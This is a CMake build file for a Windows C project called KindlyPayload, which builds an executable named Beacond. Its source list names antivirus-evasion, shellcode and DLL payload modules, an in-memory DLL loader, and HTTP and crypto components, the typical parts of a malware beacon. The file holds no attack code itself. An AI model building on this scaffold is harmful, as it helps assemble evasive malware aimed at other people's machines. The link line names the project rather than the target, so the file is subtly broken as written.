cmake_minimum_required(VERSION 3.28)
project(KindlyPayload C)

set(CMAKE_C_STANDARD 11)

add_executable(Beacond
        Core/Include/API.h
        Core/Src/API.c
        Core/Src/Http.c
        Core/Include/Http.h
        Beacond.h
        Core/Include/Wrappers.h
        Core/Include/Macros.h
        Core/Include/EvadeAV.h
        Core/Src/EvadeAV.c
        Lib/cJSON/cJSON.c
        Lib/cJSON/cJSON.h
        Core/Include/Crypto.h
        Core/Src/Crypto.c
        Core/Include/Utils.h
        Core/Src/Utils.c
        Payloads/Shellcode.c
        Payloads/Dll.c
        Lib/DLLMemLdr/DllMemLdr.c
        Lib/DLLMemLdr/DllMemLdr.h
        Payloads/Common/Common.h
        Payloads/Common/Common.c)

target_link_libraries(KindlyPayload wininet)

